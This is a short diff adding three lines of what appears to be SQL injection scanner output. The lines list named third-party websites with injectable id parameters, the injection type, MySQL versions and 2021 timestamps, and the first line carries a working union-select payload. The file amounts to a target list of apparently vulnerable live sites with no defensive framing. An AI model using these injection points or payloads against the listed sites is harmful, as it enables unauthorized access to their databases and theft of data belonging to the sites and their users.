@@ -1,0 +1,3 @@
+http://www.orvec.com/news-article.php?id=5' union all select 1,2,3,4,5,6,[t],8 and '1'='1|MySQL Union|5.7.16||[--] Unknown||03/20/2021 13:44:19|
+http://animalbehaviorandcognition.org/article.php?id=[t]|MySQL Error|5.6.49||[--] Unknown||03/20/2021 13:45:14|
+http://edgartownlibrary.org/article.php?id=[t]|MySQL Error|5.6.51||[--] Unknown||03/20/2021 13:45:27|
